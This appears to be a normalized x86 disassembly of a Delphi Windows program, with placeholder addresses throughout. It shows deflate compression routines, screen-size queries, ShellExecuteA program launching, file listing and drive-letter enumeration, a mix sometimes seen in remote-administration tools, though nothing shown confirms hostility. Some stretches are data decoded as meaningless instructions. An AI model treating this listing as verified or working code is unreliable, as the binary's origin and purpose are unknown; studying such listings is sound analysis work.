mov esi edi
shl si cl
or [ ebx + 0x16b4 ] si
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
pop esi
mov cl [ ebx + 0x16b4 ]
and cl 0xff
mov [ esi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov esi [ ebx + 0x8 ]
lea ecx [ esi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop esi
mov [ esi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edx di
sar edx cl
mov [ ebx + 0x16b4 ] dx
sub eax 0x10
add eax [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] eax
jmp r-xdata
mov eax rw-data
mov edx 0x10
mov esi [ ebx + 0x16b8 ]
movzx eax [ eax ]
sub edx eax
cmp edx esi
jge r-xdata
mov eax ebx
call sub_46cef8
sub_46c6f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x4 ] edx
xor eax eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x80 ] 0x0
mov edi ecx
jle r-xdata
lea edx [ edi + 0x5 ]
mov eax edx
test edi edi
jbe r-xdata
cmp [ ebx + 0x84 ] 0x4
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea edx [ ebx + 0xb14 ]
mov eax ebx
call sub_46b670
lea edx [ ebx + 0xb20 ]
mov eax ebx
call sub_46b670
mov eax ebx
call sub_46c014
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x16a4 ]
mov edx [ ebx + 0x16a8 ]
add edx 0xa
add eax 0xa
shr eax 0x3
shr edx 0x3
cmp eax edx
jb r-xdata
mov edx [ ebx ]
cmp [ edx + 0x2c ] 0x2
jne r-xdata
mov eax 0x3
mov edx 0x10
sub edx eax
cmp edx [ ebx + 0x16b8 ]
jge r-xdata
cmp eax edx
jne r-xdata
push esi
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_46c370
jmp r-xdata
lea ecx [ edi + 0x4 ]
cmp eax ecx
jb r-xdata
mov eax edx
jmp r-xdata
mov eax ebx
call sub_46ce90
mov ecx [ ebx + 0x16b8 ]
mov edx esi
add dx 0x2
shl dx cl
or [ ebx + 0x16b4 ] dx
add [ ebx + 0x16b8 ] eax
lea edx [ esi + 0x2 ]
mov ecx [ ebx + 0x16b8 ]
mov edi edx
shl di cl
or [ ebx + 0x16b4 ] di
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
pop edi
mov cl [ ebx + 0x16b4 ]
and cl 0xff
mov [ edi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop edi
mov [ edi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edx dx
sar edx cl
mov [ ebx + 0x16b4 ] dx
sub eax 0x10
add eax [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] eax
jmp r-xdata
mov eax 0x3
mov edx 0x10
sub edx eax
cmp edx [ ebx + 0x16b8 ]
jge r-xdata
mov eax ebx
call sub_46b2a0
test esi esi
je r-xdata
mov ecx rw-data
mov edx rw-data
mov eax ebx
call sub_46c9d0
jmp r-xdata
mov ecx [ ebx + 0x16b8 ]
mov edx esi
add dx 0x4
shl dx cl
or [ ebx + 0x16b4 ] dx
add [ ebx + 0x16b8 ] eax
lea edx [ esi + 0x4 ]
mov ecx [ ebx + 0x16b8 ]
mov edi edx
shl di cl
or [ ebx + 0x16b4 ] di
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
pop edi
mov cl [ ebx + 0x16b4 ]
and cl 0xff
mov [ edi ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edi [ ebx + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ ebx + 0x16b4 ]
sar ecx 0x8
pop edi
mov [ edi ] cl
mov ecx 0x10
sub ecx [ ebx + 0x16b8 ]
movzx edx dx
sar edx cl
mov [ ebx + 0x16b4 ] dx
sub eax 0x10
add eax [ ebx + 0x16b8 ]
mov [ ebx + 0x16b8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_46cf6c
mov eax [ ebp - 0x8 ]
inc eax
push eax
mov eax ebx
mov ecx [ ebx + 0xb24 ]
mov edx [ ebx + 0xb18 ]
inc ecx
inc edx
call sub_46c078
lea ecx [ ebx + 0x984 ]
lea edx [ ebx + 0x90 ]
mov eax ebx
call sub_46c9d0
sub_46c944
push ebx
push esi
mov esi [ eax + 0x169c ]
mov ebx [ eax + 0x16a0 ]
mov [ ebx + esi * 2 ] dx
mov ebx [ eax + 0x169c ]
inc [ eax + 0x169c ]
mov esi [ eax + 0x1694 ]
test edx edx
lea ebx [ esi + ebx ]
push ebx
pop ebx
mov [ ebx ] cl
jne r-xdata
inc [ eax + 0x16ac ]
dec edx
movzx ecx [ ecx + rw-data ]
inc [ eax + ecx * 4 + 0x494 ]
cmp edx 0x100
jae r-xdata
inc [ eax + ecx * 4 + 0x90 ]
jmp r-xdata
shr edx 0x7
mov cl [ edx + rw-data ]
mov cl [ edx + rw-data ]
jmp r-xdata
mov edx [ eax + 0x1698 ]
dec edx
cmp edx [ eax + 0x169c ]
sete al
and eax 0x1
pop esi
pop ebx
retn
xor edx edx
mov dl cl
inc [ eax + edx * 4 + 0x984 ]
sub_46c9d0
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] ecx
xor ecx ecx
mov [ esp + 0x4 ] ecx
cmp [ eax + 0x169c ] 0x0
je r-xdata
movzx ebx [ edx + 0x402 ]
mov ecx 0x10
sub ecx ebx
mov edi [ eax + 0x16b8 ]
cmp ecx edi
jge r-xdata
mov ecx [ eax + 0x16a0 ]
mov ebx [ esp + 0x4 ]
movzx esi [ ecx + ebx * 2 ]
mov ecx [ eax + 0x1694 ]
mov ebx [ esp + 0x4 ]
movzx edi [ ecx + ebx ]
inc [ esp + 0x4 ]
test esi esi
jne r-xdata
mov si [ edx + 0x400 ]
mov ecx [ eax + 0x16b8 ]
shl si cl
or [ eax + 0x16b4 ] si
add [ eax + 0x16b8 ] ebx
movzx esi [ edx + 0x400 ]
mov ecx edi
mov edi esi
shl di cl
or [ eax + 0x16b4 ] di
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
pop edi
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ edi ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop edi
mov [ edi ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx esi si
sar esi cl
mov [ eax + 0x16b4 ] si
sub ebx 0x10
add ebx [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] ebx
jmp r-xdata
xor ebx ebx
mov bl [ edi + rw-data ]
movzx ecx [ edx + ebx * 4 + 0x406 ]
mov [ esp + 0x8 ] ecx
mov ecx 0x10
sub ecx [ esp + 0x8 ]
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
movzx ebx [ edx + edi * 4 + 0x2 ]
mov ecx 0x10
sub ecx ebx
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
movzx edx [ edx + 0x402 ]
mov [ eax + 0x16b0 ] edx
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov bp [ edx + ebx * 4 + 0x404 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ esp + 0x8 ]
add [ eax + 0x16b8 ] ecx
movzx ecx [ edx + ebx * 4 + 0x404 ]
mov [ esp + 0xc ] ecx
mov bp [ esp + 0xc ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebp [ esp + 0xc ]
sar ebp cl
mov [ eax + 0x16b4 ] bp
mov ecx [ esp + 0x8 ]
sub ecx 0x10
add ecx [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] ecx
jmp r-xdata
mov si [ edx + edi * 4 ]
mov ecx [ eax + 0x16b8 ]
shl si cl
or [ eax + 0x16b4 ] si
add [ eax + 0x16b8 ] ebx
jmp r-xdata
movzx esi [ edx + edi * 4 ]
mov ecx [ eax + 0x16b8 ]
mov edi esi
mov ebp edi
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx esi di
sar esi cl
mov [ eax + 0x16b4 ] si
sub ebx 0x10
add ebx [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] ebx
jmp r-xdata
dec esi
cmp esi 0x100
jae r-xdata
sub edi [ ebx * 4 + rw-data ]
mov ebx ecx
mov ecx 0x10
sub ecx ebx
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
mov ecx [ ebx * 4 + rw-data ]
test ecx ecx
je r-xdata
mov ecx [ esp + 0x4 ]
cmp ecx [ eax + 0x169c ]
jb r-xdata
mov ecx esi
shr ecx 0x7
mov bl [ ecx + rw-data ]
mov bl [ esi + rw-data ]
jmp r-xdata
mov ecx [ eax + 0x16b8 ]
shl di cl
or [ eax + 0x16b4 ] di
add [ eax + 0x16b8 ] ebx
mov ecx [ eax + 0x16b8 ]
mov ebp edi
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx edi di
sar edi cl
mov [ eax + 0x16b4 ] di
sub ebx 0x10
add ebx [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] ebx
jmp r-xdata
mov ecx [ eax + 0x16b8 ]
mov ebp [ esp ]
mov bp [ ebp + ebx * 4 ]
shl bp cl
or [ eax + 0x16b4 ] bp
add [ eax + 0x16b8 ] edi
mov ecx [ esp ]
movzx ecx [ ecx + ebx * 4 ]
mov [ esp + 0x10 ] ecx
mov bp [ esp + 0x10 ]
mov ecx [ eax + 0x16b8 ]
shl bp cl
or [ eax + 0x16b4 ] bp
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
pop ebp
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ ebp ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebp [ eax + 0x8 ]
lea ecx [ ebp + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop ebp
mov [ ebp ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx ebp [ esp + 0x10 ]
sar ebp cl
mov [ eax + 0x16b4 ] bp
sub edi 0x10
add edi [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] edi
jmp r-xdata
and ebx 0xff
mov ecx [ esp ]
movzx edi [ ecx + ebx * 4 + 0x2 ]
mov ecx 0x10
sub ecx edi
cmp ecx [ eax + 0x16b8 ]
jge r-xdata
sub esi [ ebx * 4 + rw-data ]
mov ebx ecx
mov ecx 0x10
sub ecx ebx
mov edi [ eax + 0x16b8 ]
cmp ecx edi
jge r-xdata
mov ecx [ ebx * 4 + rw-data ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x16b8 ]
shl si cl
or [ eax + 0x16b4 ] si
add [ eax + 0x16b8 ] ebx
mov ecx edi
mov edi esi
shl di cl
or [ eax + 0x16b4 ] di
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
pop edi
mov cl [ eax + 0x16b4 ]
and cl 0xff
mov [ edi ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edi [ eax + 0x8 ]
lea ecx [ edi + ecx ]
push ecx
movzx ecx [ eax + 0x16b4 ]
sar ecx 0x8
pop edi
mov [ edi ] cl
mov ecx 0x10
sub ecx [ eax + 0x16b8 ]
movzx esi si
sar esi cl
mov [ eax + 0x16b4 ] si
sub ebx 0x10
add ebx [ eax + 0x16b8 ]
mov [ eax + 0x16b8 ] ebx
jmp r-xdata
sub_46ce90
xor edx edx
lea ecx [ eax + 0x90 ]
cmp edx 0x9
jne r-xdata
inc edx
add ecx 0x4
cmp edx 0x9
jl r-xdata
cmp edx 0x20
jne r-xdata
mov edx 0xe
lea ecx [ eax + 0xc8 ]
cmp [ ecx ] 0x0
jne r-xdata
xor edx edx
mov edx 0x1
jmp r-xdata
inc edx
add ecx 0x4
cmp edx 0x20
jl r-xdata
mov eax [ eax ]
mov [ eax + 0x2c ] edx
retn
cmp [ ecx ] 0x0
jne r-xdata
sub_46cedc
push ebx
xor ecx ecx
mov ebx eax
and ebx 0x1
shr eax 0x1
or ecx ebx
add ecx ecx
dec edx
test edx edx
jg r-xdata
mov eax ecx
shr eax 0x1
pop ebx
retn
sub_46cef8
push ebx
cmp [ eax + 0x16b8 ] 0x10
jne r-xdata
cmp [ eax + 0x16b8 ] 0x8
jl r-xdata
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
mov bl [ eax + 0x16b4 ]
and bl 0xff
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
movzx ebx [ eax + 0x16b4 ]
sar ebx 0x8
mov [ ecx + edx ] bl
mov [ eax + 0x16b4 ] 0x0
xor edx edx
mov [ eax + 0x16b8 ] edx
pop ebx
retn
pop ebx
retn
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov edx [ eax + 0x8 ]
mov bl [ eax + 0x16b4 ]
mov [ edx + ecx ] bl
shr [ eax + 0x16b4 ] 0x8
sub [ eax + 0x16b8 ] 0x8
sub_46cf6c
push ebx
cmp [ eax + 0x16b8 ] 0x8
jle r-xdata
cmp [ eax + 0x16b8 ] 0x0
jle r-xdata
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
mov bl [ eax + 0x16b4 ]
and bl 0xff
mov [ ecx + edx ] bl
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
movzx ebx [ eax + 0x16b4 ]
sar ebx 0x8
mov [ ecx + edx ] bl
jmp r-xdata
mov [ eax + 0x16b4 ] 0x0
xor edx edx
mov [ eax + 0x16b8 ] edx
pop ebx
retn
mov edx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ecx [ eax + 0x8 ]
mov bl [ eax + 0x16b4 ]
mov [ ecx + edx ] bl
sub_46cfd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_46cf6c
mov [ ebx + 0x16b0 ] 0x8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax edi
add edi 0xffffffff
test eax eax
jne r-xdata
mov edx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov ecx [ ebx + 0x8 ]
lea edx [ ecx + edx ]
push edx
mov eax edi
mov ecx eax
and cl 0xff
pop edx
mov [ edx ] cl
mov ecx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
lea ecx [ edx + ecx ]
push ecx
movzx edx di
sar edx 0x8
pop ecx
mov [ ecx ] dl
mov edx [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov ecx [ ebx + 0x8 ]
not al
lea edx [ ecx + edx ]
and al 0xff
push edx
pop ecx
mov [ ecx ] al
mov eax [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
mov ecx edi
not cx
movzx ecx cx
sar ecx 0x8
mov [ edx + eax ] cl
jmp r-xdata
mov eax [ ebx + 0x14 ]
inc [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
mov cl [ esi ]
mov [ edx + eax ] cl
inc esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_46d070
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edx [ ebp - 0x4 ]
mov [ ebp - 0x3c ] edx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x30 ] eax
mov edx [ esi ]
mov eax edx
mov [ ebp - 0x2c ] eax
cmp edx eax
je r-xdata
xor edx edx
mov [ ebp - 0x1c ] edx
xor ecx ecx
mov [ ebp - 0x18 ] ecx
xor eax eax
mov [ ebp - 0x14 ] eax
push 0x38
mov ecx rw-data
lea eax [ ebp - 0x3c ]
mov edx [ ebp + 0x8 ]
call sub_467c84
mov ebx eax
test ebx ebx
je r-xdata
mov eax 0xfffffffb
jmp r-xdata
lea eax [ ebp - 0x3c ]
mov edx 0x4
call sub_468240
mov ebx eax
cmp ebx 0x1
je r-xdata
mov eax ebx
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ebp - 0x28 ]
lea eax [ ebp - 0x3c ]
mov [ esi ] edx
call sub_468504
mov ebx eax
mov eax ebx
lea eax [ ebp - 0x3c ]
call sub_468504
test ebx ebx
jne r-xdata
mov eax ebx
jmp r-xdata
mov eax 0xfffffffb
jmp r-xdata
sub_46d13c
push cs
or edx [ esp + eax * 2 + 0x61 ]
je r-xdata
push cs
add [ eax ] al
add [ ecx ] dh
xor dh [ edi ]
xor [ cs : esi ] ch
xor [ esi ] ch
xor [ edx ] edi
xor [ esi ] esi
xor [ eax + eax ] dh
add bh bh
push esp
push 0x64616572
adc al 0x0
add [ eax ] al
add eax 0x94000000
adc [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
add al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
or [ eax ] al
add [ eax ] al
xchg esp eax
adc [ eax ] al
or al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
lea eax [ eax ]
adc cl 0x46
add [ esi ] cl
or edx [ esp + eax * 2 + 0x75 ]
insd
jo r-xdata
push es
add [ eax ] al
add [ ebp + 0x6e ] dl
imul ebp [ esi + 0x6f ] 0x77
add [ eax ] al
push 0x64616572
adc al 0x0
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
lea eax [ eax ]
sub_46d180
push cs
or edx [ esp + eax * 2 + 0x75 ]
insd
jo r-xdata
push es
add [ eax ] al
add [ ebp + 0x6e ] dl
imul ebp [ esi + 0x6f ] 0x77
add [ eax ] al
push 0x64616572
adc al 0x0
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc [ eax ] al
add [ eax ] al
lea eax [ eax ]
sub_46d1eb
inc [ 0x35000000 ]
xor ebp [ cs : esi ]
xor [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46d2e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d2e8
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
mov eax rw-data
call sub_405530
sub_46d2ec
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46d354
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call GetSystemMetrics
lea edx [ ebp - 0x4 ]
call sub_409d70
push [ ebp - 0x4 ]
push r-xdata
push 0x1
call GetSystemMetrics
lea edx [ ebp - 0x8 ]
call sub_409d70
push [ ebp - 0x8 ]
mov eax ebx
mov edx 0x3
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d35b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_46d36c
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
xor eax eax
push ebp
push sub_46d3d9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
lea eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405864
mov eax [ ebp - 0x8 ]
call sub_4059dc
push eax
push r-xdata
push r-xdata
push 0x0
call ShellExecuteA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d3e0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_405554
retn
sub_46d400
push ebp
mov ebp esp
mov ecx 0x65
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov [ ebp - 0x19c ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4059cc
lea eax [ ebp - 0x198 ]
mov edx [ r-xdata ]
call sub_405fe8
mov edi [ rw-data ]
xor eax eax
push ebp
push sub_46d75f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_46d6ee
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x31c ]
mov ecx r-xdata
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x31c ]
lea ecx [ ebp - 0x198 ]
mov edx 0x3f
call sub_40a488
mov esi eax
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ ebp - 0x188 ]
test ebx 0x2
jle r-xdata
lea eax [ ebp - 0x198 ]
call sub_40a4fc
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0xc ]
mov eax [ ebp - 0x19c ]
mov edx 0x3
call sub_4058e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d766
lea eax [ ebp - 0x328 ]
mov edx 0x4
call sub_405554
lea eax [ ebp - 0x198 ]
mov edx [ r-xdata ]
call sub_4060ac
lea eax [ ebp - 0x38 ]
mov edx 0xe
call sub_405554
retn
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x14 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x1c ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
test ebx 0x20
jle r-xdata
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x18 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
test ebx 0x1
jle r-xdata
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_4055c8
lea eax [ ebp - 0x20 ]
mov edx r-xdata
call sub_4055c8
jmp r-xdata
test ebx 0x4
jle r-xdata
push 0x400
push 0x160
lea eax [ ebp - 0x318 ]
push eax
push 0x0
lea eax [ ebp - 0x320 ]
mov ecx [ ebp - 0x184 ]
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x320 ]
call sub_4059dc
push eax
call SHGetFileInfoA
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0x208 ]
mov ecx 0x50
call sub_4057a0
lea eax [ ebp - 0x1b0 ]
push eax
lea eax [ ebp - 0x324 ]
mov ecx [ ebp - 0x184 ]
mov edx [ ebp - 0x4 ]
call sub_405864
mov eax [ ebp - 0x324 ]
lea ecx [ ebp - 0x1b8 ]
lea edx [ ebp - 0x1a8 ]
call sub_48c72c
push [ ebp - 0x1a4 ]
push [ ebp - 0x1a8 ]
mov edx [ edi ]
lea eax [ ebp - 0x34 ]
call sub_40c8f8
push [ ebp - 0x1ac ]
push [ ebp - 0x1b0 ]
mov edx [ edi ]
lea eax [ ebp - 0x38 ]
call sub_40c8f8
push [ ebp - 0xc ]
push [ ebp - 0x184 ]
push r-xdata
push [ ebp - 0x18c ]
push [ ebp - 0x190 ]
lea eax [ ebp - 0x328 ]
call sub_409e5c
push [ ebp - 0x328 ]
push r-xdata
push [ ebp - 0x10 ]
push r-xdata
push [ ebp - 0x34 ]
push r-xdata
push [ ebp - 0x38 ]
push r-xdata
push [ ebp - 0x28 ]
push r-xdata
lea eax [ ebp - 0xc ]
mov edx 0xd
call sub_4058e0
lea eax [ ebp - 0x1b0 ]
push eax
lea ecx [ ebp - 0x1b8 ]
lea edx [ ebp - 0x1a8 ]
mov eax [ ebp - 0x184 ]
call sub_48c72c
push [ ebp - 0x1a4 ]
push [ ebp - 0x1a8 ]
mov edx [ edi ]
lea eax [ ebp - 0x2c ]
call sub_40c8f8
push [ ebp - 0x1ac ]
push [ ebp - 0x1b0 ]
mov edx [ edi ]
lea eax [ ebp - 0x30 ]
call sub_40c8f8
push [ ebp - 0x8 ]
push [ ebp - 0x184 ]
push r-xdata
push [ ebp - 0x2c ]
push r-xdata
push [ ebp - 0x30 ]
push r-xdata
push [ ebp - 0x28 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0x9
call sub_4058e0
jmp r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x24 ]
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_4058e0
test ebx 0x10
jle r-xdata
lea eax [ ebp - 0x198 ]
call sub_40a4d8
mov esi eax
test esi esi
je r-xdata
sub_46d854
push ebp
mov ebp esp
mov ecx 0x5
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_46d995
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x41
inc ebx
cmp bl 0x5b
jne r-xdata
lea eax [ ebp - 0x18 ]
call sub_489d40
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x14 ]
call sub_40a5d4
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x10 ]
call sub_409b7c
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x24 ]
mov edx ebx
mov [ eax + 0x1 ] dl
mov [ eax ] 0x1
lea edx [ ebp - 0x24 ]
lea eax [ ebp - 0x28 ]
call sub_4039a0
mov edx r-xdata
lea eax [ ebp - 0x28 ]
mov cl 0x2
call sub_403970
lea edx [ ebp - 0x28 ]
lea eax [ ebp - 0x20 ]
call sub_405794
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x1c ]
call sub_409b7c
mov edx [ ebp - 0x1c ]
pop eax
call sub_405974
jne r-xdata
lea eax [ ebp - 0xc ]
mov edx ebx
call sub_405718
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_405818
mov eax [ ebp - 0xc ]
call sub_4059dc
push eax
call GetDriveTypeA
mov esi eax
cmp esi 0x1
jle r-xdata
mov eax edi
mov edx [ ebp - 0x4 ]
call sub_405584
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d99c
lea eax [ ebp - 0x2c ]
call sub_405530
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_405554
retn
lea eax [ ebp - 0x8 ]
mov edx [ esi * 4 + rw-data ]
call sub_4055c8
lea eax [ ebp - 0x8 ]
